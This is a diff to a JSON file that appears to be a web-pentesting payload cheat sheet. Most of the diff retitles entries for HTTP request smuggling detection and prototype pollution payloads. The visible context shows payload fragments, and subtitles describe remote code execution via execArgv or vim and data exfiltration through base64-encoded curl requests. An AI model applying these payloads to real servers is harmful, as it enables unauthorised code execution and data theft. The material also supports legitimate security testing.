@@ -9,7 +9,7 @@
         ]
     },
     {
-        "title": "DETECTING CL.TE",
+        "title": "REQUEST SMUGGLING DETECTING CL.TE",
         "subtitle": "- Timeout means success  <br> - Rejection means the backend is using TE",
         "commands": [
             "Content-Length: 6",
@@ -22,7 +22,7 @@
         ]
     },
     {
-        "title": "DETECTING TE.CL",
+        "title": "REQUEST SMUGGLING DETECTING TE.CL",
         "subtitle": "Timeout means success",
         "commands": [
             "Content-Length: 6",
@@ -65,7 +65,7 @@
         ]
     },
     {
-        "title": "PROTOTYPE POLLUTION 1",
+        "title": "PROTOTYPE POLLUTION: JSON SPACES",
         "subtitle": "Tampers with json response spacing",
         "commands": [
             "\"__proto__\":{",
@@ -74,7 +74,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 2: CHARSET OVERRIDE",
+        "title": "PROTOTYPE POLLUTION: CHARSET OVERRIDE",
         "subtitle": "- Forces the server to render values in UTF-7 encoding if controllable. <br> - Tip: if there is a controllable value and it is reflecting, give it a value converted to utf7. <br> - After that, add the above payload to see if the charset obeyed and rendered the value in utf-7.",
         "commands": [
             "\"__proto__\":{",
@@ -83,7 +83,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 3: OVERRIDING THE STATUS",
+        "title": "PROTOTYPE POLLUTION: OVERRIDING THE STATUS",
         "subtitle": "- Overrides error status returned by the server. <br>- Tip: First send improperly formatted JSON and note the error variable.<br> - Use that variable with __proto__ to override it, then trigger the error again and check if the overridden value exists.",
         "commands": [
             "\"__proto__\":{",
@@ -92,7 +92,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 4: USING CONSTRUCTOR",
+        "title": "PROTOTYPE POLLUTION: USING CONSTRUCTOR",
         "subtitle": "Injects new properties into the object prototype using constructor.",
         "commands": [
             "\"constructor\":{",
@@ -103,7 +103,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 5: REMOTE CODE EXECUTION",
+        "title": "PROTOTYPE POLLUTION: REMOTE CODE EXECUTION",
         "subtitle": "Abuses execArgv to execute system commands remotely.",
         "commands": [
             "\"__proto__\": {",
@@ -114,7 +114,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 6: RCE USING VIM",
+        "title": "PROTOTYPE POLLUTION: RCE USING VIM",
         "subtitle": "Sets shell to vim and abuses :! command to send request to collaborator.",
         "commands": [
             "\"__proto__\":{",
@@ -124,7 +124,7 @@
         ]
     },
     {
-        "title": "PAYLOAD 7: EXTRACTING DATA",
+        "title": "PROTOTYPE POLLUTION: EXTRACTING DATA",
         "subtitle": "Exfiltrates data using vim shell and base64 encoded curl requests.",
         "commands": [
             "\"__proto__\":{",
@@ -202,7 +202,7 @@
     },
     {
         "title": "MISCONFIG MAPPER",
-        "subtitle": "",
+        "subtitle": "Searches for misconfigs in third party technology integration",
         "commands": [
             "misconfig-mapper -target \"yourcompanyname\" -service \"*\" -delay 1000"
         ]
